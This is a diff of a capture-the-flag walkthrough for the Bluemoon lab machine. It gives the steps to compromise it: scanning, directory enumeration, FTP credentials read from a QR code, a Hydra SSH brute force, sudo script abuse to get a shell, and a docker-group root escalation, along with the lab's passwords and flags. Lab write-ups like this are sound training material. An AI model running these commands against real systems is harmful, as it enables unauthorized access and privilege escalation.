@@ -24,6 +24,7 @@ Ping to check connectivity
 ping 192.168.56.102
 ```
 <img width="654" height="274" alt="image" src="https://github.com/user-attachments/assets/f81b734d-be54-46b9-9c1c-7675a6854f9c" />
+
 Confirmed host is alive. CTRL + C to stop ping.
 
 ## Step 3: Run Nmap to scan Bluemoon
@@ -31,6 +32,7 @@ Confirmed host is alive. CTRL + C to stop ping.
 nmap -sC -sV 192.168.56.102
 ```
 <img width="653" height="464" alt="image" src="https://github.com/user-attachments/assets/69d1c144-5501-4fce-b8ac-7661c3edcdf3" />
+
 Found open ports: 21 FTP, 22 SSH, 80 HTTP
 
 ## Step 4: Visit the Website using Firefox
@@ -38,6 +40,7 @@ Found open ports: 21 FTP, 22 SSH, 80 HTTP
 http://192.168.56.102
 ```
 <img width="955" height="738" alt="image" src="https://github.com/user-attachments/assets/f4eea244-eed3-4653-b1a3-e677901f9c6c" />
+
 You will see the Bluemoon page
 
 ## Step 5: Directory Enumeration
@@ -46,6 +49,7 @@ Use Gobuster
 gobuster dir -u http://192.168.56.102 w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 <img width="647" height="553" alt="image" src="https://github.com/user-attachments/assets/e1c3ea6a-ec98-4b86-b411-c7fb5def4f30" />
+
 Found /hidden_text
 
 ## Step 6: Find the QR Code
@@ -54,7 +58,9 @@ Visit Hidden Page in Firefox
 http://192.168.56.102/hidden_text
 ```
 <img width="959" height="406" alt="image" src="https://github.com/user-attachments/assets/51548272-daad-4b97-a79e-ae2b78c013c3" />
+
 Press on the 'Thank You' link to find the QR Code
+
 <img width="956" height="640" alt="image" src="https://github.com/user-attachments/assets/dfcef7ed-663b-441e-8607-de2b020514ef" />
 
 ## Step 7: Download the QR Code
@@ -75,6 +81,7 @@ Using the command:
 zbarimg .QR_C0d3.ong
 ```
 <img width="656" height="234" alt="image" src="https://github.com/user-attachments/assets/92211b45-3418-4068-aea1-3e9b0341641c" />
+
 You will get FTP credentials
 USER=userftp
 PASSWORD=ftpp@ssword
@@ -91,6 +98,7 @@ ftp 192.168.56.102
 ls
 ```
 <img width="585" height="112" alt="image" src="https://github.com/user-attachments/assets/0370dc2b-0f57-42ce-81b0-9b1ea6c639ff" />
+
 You should see information.txt and p_lists.txt
 
 ## Step 12: Download Files
@@ -99,6 +107,7 @@ get information.txt
 get p_lists.txt
 ```
 <img width="651" height="247" alt="image" src="https://github.com/user-attachments/assets/9abe97b0-cdcd-44df-855b-0cce45af2c56" />
+
 Then exit ftp with the command: bye
 
 ## Step 13: Read the Files
@@ -109,6 +118,7 @@ cat p_lists.txt
 ```
 <img width="711" height="134" alt="image" src="https://github.com/user-attachments/assets/736713b3-6943-4de2-8c5c-a7495dcdf8c8" />
 <img width="186" height="620" alt="image" src="https://github.com/user-attachments/assets/7eb51d90-f4f6-4386-ac89-d48e2aa48bf9" />
+
 You will get the possible username: robin, and a password list
 
 ## Step 14: Brute Force SSH
@@ -117,6 +127,7 @@ Use Hydra with the command:
 hydra -l robin -P p_lists.txt ssh://192.168.56.102
 ```
 <img width="715" height="388" alt="image" src="https://github.com/user-attachments/assets/4458cad0-e8b7-4698-a5c0-29ae1a6db60a" />
+
 You will get
 login: robin
 password: k4rv3ndh4nh4ck3r
@@ -134,6 +145,7 @@ Check files using
 ls
 ```
 <img width="182" height="38" alt="image" src="https://github.com/user-attachments/assets/67c75053-e031-4777-9906-74e591627fb0" />
+
 You will see project   user1.txt
 
 Read the flag using the command:
@@ -141,6 +153,7 @@ Read the flag using the command:
 cat user1.txt
 ```
 <img width="365" height="78" alt="image" src="https://github.com/user-attachments/assets/445f6863-94f9-40f7-8609-90f6dfb546fa" />
+
 You will get the first flag: Fl4g{u5er1r34ch3d5ucc355fully}
 
 ## Step 17: Privilege Escalation to Jerry
@@ -150,6 +163,7 @@ cd project
 ls
 ```
 <img width="272" height="79" alt="image" src="https://github.com/user-attachments/assets/f7b81057-901b-4e57-af31-95d81a44cfb3" />
+
 You will get 'feedback.sh'
 
 ## Step 18: Check Sudo Rights
@@ -158,6 +172,7 @@ Use the command:
 sudo -l
 ```
 <img width="656" height="130" alt="image" src="https://github.com/user-attachments/assets/a25de76b-ac9e-4d29-9aca-c6e45b7baeb5" />
+
 You will notice: (robin) can run feedback.sh as jerry
 
 ## Step 19: Run Script
@@ -166,6 +181,7 @@ Using the command:
 sudo -u jerry ./feedback.sh
 ```
 <img width="721" height="165" alt="image" src="https://github.com/user-attachments/assets/20deb2a1-64f6-4dfd-bdf5-574df1d9ac34" />
+
 Type in:
 ```bash
 /bin/bash
@@ -202,6 +218,7 @@ Use the command:
 cat user2.txt
 ```
 <img width="375" height="163" alt="image" src="https://github.com/user-attachments/assets/8265b55b-7c0d-436c-ada9-fb8162c47d1e" />
+
 You will get the second flag: Fl4g{Y0ur34ch3du53r25uc355ful1y}
 
 ## Step 24: Root Privilege Escalation
@@ -210,6 +227,7 @@ Use the command:
 id
 ```
 <img width="525" height="41" alt="image" src="https://github.com/user-attachments/assets/ddb9fd3f-dcde-4c4c-ad94-28d5a66d5e6a" />
+
 You will notice docker
 
 ## Step 25: Abuse Docker Group
@@ -218,6 +236,7 @@ Use the command:
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
 <img width="566" height="33" alt="image" src="https://github.com/user-attachments/assets/87502b29-25d8-4783-a2b6-c8b1cae001dd" />
+
 You will see #, which means you now have root access
 
 ## Step 26: Root Flag
@@ -227,6 +246,7 @@ cd /root
 ls
 ```
 <img width="95" height="51" alt="image" src="https://github.com/user-attachments/assets/506108c9-14fe-484a-b553-356efc847162" />
+
 You will find root.txt
 
 ## Step 27: Get Final Flag
@@ -235,4 +255,5 @@ Read the file with the command:
 cat root.txt
 ```
 <img width="306" height="365" alt="image" src="https://github.com/user-attachments/assets/b0f5f34e-1d4a-4c46-9e65-593688a2d010" />
+
 You will get the final flag: Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}
